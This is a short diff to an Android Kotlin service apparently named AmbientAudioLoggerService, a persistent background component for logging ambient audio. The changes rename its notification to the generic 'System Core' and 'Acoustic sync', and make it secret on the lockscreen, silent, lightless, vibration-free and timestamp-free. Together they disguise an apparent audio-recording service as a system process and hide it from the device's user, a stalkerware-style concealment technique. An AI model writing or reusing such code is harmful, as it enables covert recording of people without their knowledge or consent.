@@ -59,20 +59,27 @@ class AmbientAudioLoggerService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 channelId,
-                "Acoustic Integrity Service",
+                "System Core",
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
                 setShowBadge(false)
+                setSound(null, null)
+                enableLights(false)
+                enableVibration(false)
+                lockscreenVisibility = Notification.VISIBILITY_SECRET
             }
             val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
             nm.createNotificationChannel(channel)
         }
 
         return NotificationCompat.Builder(this, channelId)
-            .setContentTitle("Device Integrity")
-            .setContentText("Acoustic calibration running")
+            .setContentTitle("System Core")
+            .setContentText("Acoustic sync")
             .setSmallIcon(android.R.drawable.stat_notify_sync)
             .setPriority(NotificationCompat.PRIORITY_MIN)
+            .setVisibility(NotificationCompat.VISIBILITY_SECRET)
+            .setSilent(true)
+            .setShowWhen(false)
             .setOngoing(true)
             .build()
     }
